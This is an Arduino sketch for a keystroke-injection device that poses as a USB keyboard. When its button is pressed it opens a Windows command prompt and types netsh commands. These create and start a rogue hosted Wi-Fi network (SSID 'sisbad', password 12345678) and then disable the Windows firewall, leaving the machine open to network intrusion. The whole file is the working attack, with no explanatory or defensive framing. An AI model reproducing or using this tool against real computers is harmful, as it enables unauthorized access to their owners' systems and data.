const int buttonPin = 2;
const int ledPin =  13;
int buttonState = 0; 
char ctrlKey = KEY_LEFT_GUI;


void setup() {
  pinMode(ledPin, OUTPUT);      
  pinMode(buttonPin, INPUT);     
}

void type(int key, boolean release) {
  Keyboard.press(key);
  if(release)
    Keyboard.release(key);
}
void print(const __FlashStringHelper *value) {
  Keyboard.print(value);
}

void loop(){
  buttonState = digitalRead(buttonPin);

  if (buttonState == HIGH) { 

    Keyboard.begin();

    type(ctrlKey,false);
    type('r',false);
    Keyboard.releaseAll();
    delay(200);

    print(F("cmd"));
    delay(500);
    
    Keyboard.write('\n');
    delay(500);
    
    print(F("netsh wlan set hostednetwork mode=allow ssid=sisbad key=12345678"));

    type(KEY_RETURN,false);
    Keyboard.releaseAll();
    delay(500);

    print(F("netsh wlan start hostednetwork"));

    type(KEY_RETURN,false);
    Keyboard.releaseAll();
    delay(500);

    print(F("netsh firewall set opmode disable"));

    type(KEY_RETURN,false);
    Keyboard.releaseAll();

    print(F("exit"));

    type(KEY_RETURN,false);
    Keyboard.releaseAll();
    Keyboard.end();
  } 
  else {
    digitalWrite(ledPin, LOW); 
  }
}


